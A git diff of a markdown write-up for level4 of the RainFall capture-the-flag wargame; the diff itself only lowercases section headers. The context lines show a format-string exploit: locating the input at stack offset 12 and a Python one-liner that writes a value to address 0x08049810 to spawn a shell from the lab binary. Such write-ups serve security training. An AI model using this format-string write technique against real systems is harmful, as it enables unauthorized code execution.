@@ -1,6 +1,6 @@
-# Level4
+# level4
 
-## Exploring the binary
+## exploring the binary
 ```shell
 level4@RainFall:~$ ./level4
 phantom
@@ -110,7 +110,7 @@ AAAA 0xb7ff26b0 0xbffff784 0xb7fd0ff4 (nil) (nil) 0xbffff748 0x804848d 0xbffff54
 ```
 We found that the string <code>AAAA</code> resides in the twelfth position. With our understanding of the format string's location in the stack, our next step is to craft a string 16930116 characters in length, embedding the address of the variable (<code>0x08049810</code>) crucial for spawning the shell.
 
-## Exploit
+## exploit
 ``` shell
 level4@RainFall:~$ python -c 'print "\x08\x04\x98\x10"[::-1] + "%16930112d%12$n"' > /tmp/flag4
 level4@RainFall:~$ cat /tmp/flag4 - | ./level4
